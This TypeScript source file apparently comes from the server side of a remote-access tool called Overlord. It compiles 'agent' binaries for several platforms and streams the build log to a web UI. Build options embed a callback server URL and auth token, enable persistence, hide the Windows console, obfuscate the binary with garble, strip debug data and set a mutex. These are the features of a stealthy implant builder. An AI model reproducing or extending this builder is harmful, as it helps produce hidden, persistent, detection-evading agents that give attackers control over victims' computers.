import { $ } from "bun";
import path from "path";
import fs from "fs";
import { saveBuild } from "../db";
import { logger } from "../logger";
import { getConfig } from "../config";
import { ensureDataDir } from "../paths";
import * as buildManager from "../build/buildManager";
import type { BuildStream } from "../build/types";
import { ALLOWED_PLATFORMS } from "./validation-constants";
import { resolveRuntimeRoot } from "./runtime-paths";

function isClientModuleDir(dir: string): boolean {
  return (
    fs.existsSync(path.join(dir, "go.mod")) &&
    fs.existsSync(path.join(dir, "cmd", "agent"))
  );
}

function resolveClientModuleDir(rootDir: string): string | null {
  const candidates = [
    path.join(rootDir, "dist", "Overlord-Client"),
    path.join(rootDir, "dist", "Overlord-Client", "Overlord-Client"),
    path.join(rootDir, "Overlord-Client"),
    path.join(rootDir, "..", "Overlord-Client"),
  ];

  for (const dir of candidates) {
    if (isClientModuleDir(dir)) {
      return dir;
    }
  }

  return null;
}

function resolveClientBuildCacheRoot(): string {
  const explicit = process.env.OVERLORD_CLIENT_BUILD_CACHE_DIR?.trim();
  if (explicit) {
    return path.resolve(explicit);
  }

  // Keep UI build caches under persistent app data by default.
  return path.resolve(ensureDataDir(), "client-build-cache");
}

type BuildProcessConfig = {
  platforms: string[];
  serverUrl?: string;
  rawServerList?: boolean;
  mutex?: string;
  disableMutex?: boolean;
  stripDebug?: boolean;
  disableCgo?: boolean;
  obfuscate?: boolean;
  enablePersistence?: boolean;
  hideConsole?: boolean;
  noPrinting?: boolean;
};

type BuildProcessDeps = {
  generateBuildMutex: (length?: number) => string;
  sanitizeOutputName: (name: string) => string;
};

export async function startBuildProcess(
  buildId: string,
  config: BuildProcessConfig,
  deps: BuildProcessDeps,
): Promise<void> {
  const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;
  const BUILD_STREAM_HEARTBEAT_MS = 15_000;
  const now = Date.now();

  const build: BuildStream = {
    id: buildId,
    controllers: [],
    status: "running",
    startTime: now,
    expiresAt: now + SEVEN_DAYS_MS,
    files: [],
  };

  buildManager.addBuildStream(buildId, build);

  const sendToStream = (data: any) => {
    const encoder = new TextEncoder();
    const message = `data: ${JSON.stringify(data)}\n\n`;
    const encoded = encoder.encode(message);

    if (data.type === "output") {
      logger.info(`[build:${buildId.substring(0, 8)}] ${data.text.trimEnd()}`);
    } else if (data.type === "status") {
      logger.info(`[build:${buildId.substring(0, 8)}] STATUS: ${data.text}`);
    } else if (data.type === "error") {
      logger.error(`[build:${buildId.substring(0, 8)}] ERROR: ${data.error}`);
    }

    build.controllers.forEach((controller) => {
      try {
        controller.enqueue(encoded);
      } catch (err) {
        logger.error("[build] Failed to send to stream:", err);
      }
    });
  };

  const buildStartedAt = Date.now();
  const keepAliveTimer = setInterval(() => {
    const elapsedMinutes = Math.floor((Date.now() - buildStartedAt) / 60_000);
    sendToStream({
      type: "heartbeat",
      elapsedMinutes,
      timestamp: Date.now(),
    });
  }, BUILD_STREAM_HEARTBEAT_MS);

  try {
    const serverConfig = getConfig();
    const buildAgentToken = (serverConfig.auth.agentToken || "").trim();

    sendToStream({ type: "status", text: "Preparing build environment..." });

    try {
      const goCheck = await $`go version`.quiet();
      const goVersion = goCheck.stdout.toString().trim();
      logger.info(`[build:${buildId.substring(0, 8)}] Using ${goVersion}`);
      sendToStream({ type: "output", text: `Using ${goVersion}\n`, level: "info" });
    } catch {
      const errorMsg = "Go is not installed or not in PATH. Please install Go from https://golang.org/dl/ and ensure it's in your system PATH.";
      logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg}`);
      sendToStream({ type: "output", text: `ERROR: ${errorMsg}\n`, level: "error" });
      sendToStream({ type: "error", error: errorMsg });
      sendToStream({ type: "complete", success: false });
      build.status = "failed";
      return;
    }

    const rootDir = resolveRuntimeRoot();
    const clientDir = resolveClientModuleDir(rootDir);
    if (!clientDir) {
      throw new Error(
        `Overlord-Client source not found (missing go.mod). Checked: ${path.join(rootDir, "dist", "Overlord-Client")}, ${path.join(rootDir, "Overlord-Client")}`,
      );
    }
    const outDir = path.join(rootDir, "dist-clients");
    const cacheRoot = resolveClientBuildCacheRoot();
    const goBuildCacheDir = path.join(cacheRoot, "go-build");
    const goModCacheDir = path.join(cacheRoot, "go-mod");

    await Bun.$`mkdir -p ${outDir}`.quiet();
    fs.mkdirSync(goBuildCacheDir, { recursive: true });
    fs.mkdirSync(goModCacheDir, { recursive: true });
    sendToStream({ type: "output", text: `Build directory: ${outDir}\n`, level: "info" });
    sendToStream({ type: "output", text: `Client source: ${clientDir}\n`, level: "info" });
    sendToStream({ type: "output", text: `Client build cache: ${cacheRoot}\n`, level: "info" });

    const platformsToBuild = (config.platforms || []).filter((p) => ALLOWED_PLATFORMS.has(p));
    if (platformsToBuild.length !== (config.platforms || []).length) {
      throw new Error("One or more requested platforms are not allowed");
    }

    let buildMutex = "";
    if (!config.disableMutex) {
      buildMutex = config.mutex || deps.generateBuildMutex();
      sendToStream({ type: "output", text: `Mutex: ${buildMutex}\n`, level: "info" });
    } else {
      sendToStream({ type: "output", text: "Mutex: disabled\n", level: "info" });
    }

    for (const platform of platformsToBuild) {
      const [os, arch, ...rest] = platform.split("-");
      const goarm = rest[0] === "armv7" ? "7" : undefined;
      const actualArch = goarm ? "arm" : arch;
      const outputName = deps.sanitizeOutputName(
        platform.includes("windows") ? `agent-${platform}.exe` : `agent-${platform}`,
      );

      sendToStream({ type: "status", text: `Building ${platform}...` });
      sendToStream({ type: "output", text: `\n=== Building ${platform} ===\n`, level: "info" });

      const env: NodeJS.ProcessEnv = {
        ...process.env,
        GOOS: os,
        GOARCH: actualArch,
        CGO_ENABLED: config.disableCgo === true ? "0" : "1",
        GOWORK: "off",
        GOCACHE: goBuildCacheDir,
        GOMODCACHE: goModCacheDir,
        ...(goarm ? { GOARM: goarm } : {}),
      };

      if (env.CGO_ENABLED === "1") {
        const targetKey = `${os}/${actualArch}${goarm ? `/v${goarm}` : ""}`;
        const cCompilerByTarget: Record<string, string> = {
          "linux/amd64": "gcc",
          "windows/amd64": "x86_64-w64-mingw32-gcc",
          "windows/386": "i686-w64-mingw32-gcc",
        };
        const cxxCompilerByTarget: Record<string, string> = {
          "linux/amd64": "g++",
          "windows/amd64": "x86_64-w64-mingw32-g++",
          "windows/386": "i686-w64-mingw32-g++",
        };

        const cc = cCompilerByTarget[targetKey];
        const cxx = cxxCompilerByTarget[targetKey];
        if (cc) {
          env.CC = cc;
          sendToStream({ type: "output", text: `CGO compiler: ${cc}\n`, level: "info" });
        } else {
          sendToStream({
            type: "output",
            text: `CGO compiler not mapped for ${targetKey}; falling back to default compiler lookup\n`,
            level: "warn",
          });
        }
        if (cxx) {
          env.CXX = cxx;
        }
      }

      let ldflags = config.stripDebug !== false ? "-s -w" : "";

      if (config.serverUrl) {
        const serverFlag = `-X overlord-client/cmd/agent/config.DefaultServerURL=${config.serverUrl}`;
        ldflags = `${ldflags} ${serverFlag}`;
        sendToStream({ type: "output", text: `Server URL: ${config.serverUrl}\n`, level: "info" });
      }

      if (config.rawServerList) {
        const rawServerFlag = "-X overlord-client/cmd/agent/config.DefaultServerURLIsRaw=true";
        ldflags = ldflags ? `${ldflags} ${rawServerFlag}` : rawServerFlag;
        sendToStream({ type: "output", text: "Raw server list: enabled\n", level: "info" });
      }

      if (buildMutex) {
        const mutexFlag = `-X overlord-client/cmd/agent/config.DefaultMutex=${buildMutex}`;
        ldflags = ldflags ? `${ldflags} ${mutexFlag}` : mutexFlag;
      }

      if (config.enablePersistence) {
        const persistenceFlag = "-X overlord-client/cmd/agent/config.DefaultPersistence=true";
        ldflags = ldflags ? `${ldflags} ${persistenceFlag}` : persistenceFlag;
        sendToStream({ type: "output", text: `Persistence enabled for ${platform}\n`, level: "info" });
      }

      if (buildAgentToken) {
        const agentTokenFlag = `-X overlord-client/cmd/agent/config.DefaultAgentToken=${buildAgentToken}`;
        ldflags = ldflags ? `${ldflags} ${agentTokenFlag}` : agentTokenFlag;
      }

      if (config.hideConsole && os === "windows") {
        const hideConsoleFlag = "-H=windowsgui";
        ldflags = ldflags ? `${ldflags} ${hideConsoleFlag}` : hideConsoleFlag;
        sendToStream({ type: "output", text: "Windows console hidden (GUI subsystem)\n", level: "info" });
      }

      if (config.obfuscate) {
        sendToStream({ type: "output", text: "Obfuscation enabled (garble)\n", level: "info" });
      }

      if (config.noPrinting) {
        sendToStream({ type: "output", text: "Client printing disabled (noprint tag)\n", level: "info" });
      }

      try {
        const buildTool = config.obfuscate ? "garble" : "go";
        const verboseArg = "-x -v ";
        const tagArg = config.noPrinting ? "-tags noprint " : "";
        logger.info(`[build:${buildId.substring(0, 8)}] Building: ${buildTool} build ${verboseArg}${tagArg}${ldflags ? `-ldflags="${ldflags}" ` : ""}-o ${outDir}/${outputName} ./cmd/agent`);
        logger.info(`[build:${buildId.substring(0, 8)}] Environment: GOOS=${os} GOARCH=${actualArch} CGO_ENABLED=${env.CGO_ENABLED} CC=${env.CC || "<default>"}`);
        sendToStream({ type: "output", text: "Build trace enabled (-x -v)\n", level: "info" });

        const buildCmd = config.obfuscate
          ? (config.noPrinting
              ? (ldflags
                  ? $`garble build -x -v -tags noprint -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
                  : $`garble build -x -v -tags noprint -o ${outDir}/${outputName} ./cmd/agent`)
              : (ldflags
                  ? $`garble build -x -v -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
                  : $`garble build -x -v -o ${outDir}/${outputName} ./cmd/agent`))
          : (config.noPrinting
              ? (ldflags
                  ? $`go build -x -v -tags noprint -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
                  : $`go build -x -v -tags noprint -o ${outDir}/${outputName} ./cmd/agent`)
              : (ldflags
                  ? $`go build -x -v -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
                  : $`go build -x -v -o ${outDir}/${outputName} ./cmd/agent`));

        const proc = buildCmd.env(env).cwd(clientDir).nothrow();
        let result: any;
        for await (const line of proc.lines()) {
          const trimmed = line.trim();
          if (trimmed.length > 0) {
            sendToStream({ type: "output", text: line + "\n", level: "info" });
          }
        }

        result = await proc;

        logger.info(`[build:${buildId.substring(0, 8)}] Process exited with code: ${result.exitCode}`);

        if (result.exitCode !== 0) {
          const stderrText = result.stderr.toString();
          if (stderrText) {
            sendToStream({ type: "output", text: stderrText, level: "error" });
          }
          const errorMsg = `Build failed with exit code ${result.exitCode}\n`;
          sendToStream({ type: "output", text: errorMsg, level: "error" });
          throw new Error(`Build failed for ${platform}`);
        }

        const filePath = `${outDir}/${outputName}`;
        const file = Bun.file(filePath);
        const size = file.size;

        (build.files as any[]).push({
          name: outputName,
          filename: outputName,
          platform,
          size,
        });
      } catch (err: any) {
        const errorMsg = `[ERROR] Failed to build ${platform}: ${err.message || err}\n`;
        logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg.trim()}`);
        sendToStream({ type: "output", text: errorMsg, level: "error" });
        throw err;
      }
    }

    build.status = "completed";
    logger.info(`[build:${buildId.substring(0, 8)}] Build completed successfully! Built ${build.files.length} file(s)`);
    sendToStream({ type: "output", text: `\n[OK] Build completed successfully!\n`, level: "success" });
    sendToStream({ type: "complete", success: true, files: build.files, buildId, expiresAt: build.expiresAt });

    saveBuild({
      id: build.id,
      status: build.status,
      startTime: build.startTime,
      expiresAt: build.expiresAt,
      files: build.files as any,
    });

    setTimeout(() => {
      logger.info(`[build:${buildId.substring(0, 8)}] Cleaning up expired build`);
      buildManager.deleteBuildStream(buildId);
    }, SEVEN_DAYS_MS);
  } catch (err: any) {
    build.status = "failed";
    logger.error(`[build:${buildId.substring(0, 8)}] Build failed:`, err);
    sendToStream({ type: "error", error: err.message || String(err) });
    sendToStream({ type: "complete", success: false, buildId });

    setTimeout(() => {
      logger.info(`[build:${buildId.substring(0, 8)}] Cleaning up failed build stream`);
      buildManager.deleteBuildStream(buildId);
    }, 60 * 60 * 1000);
  } finally {
    clearInterval(keepAliveTimer);
  }
}
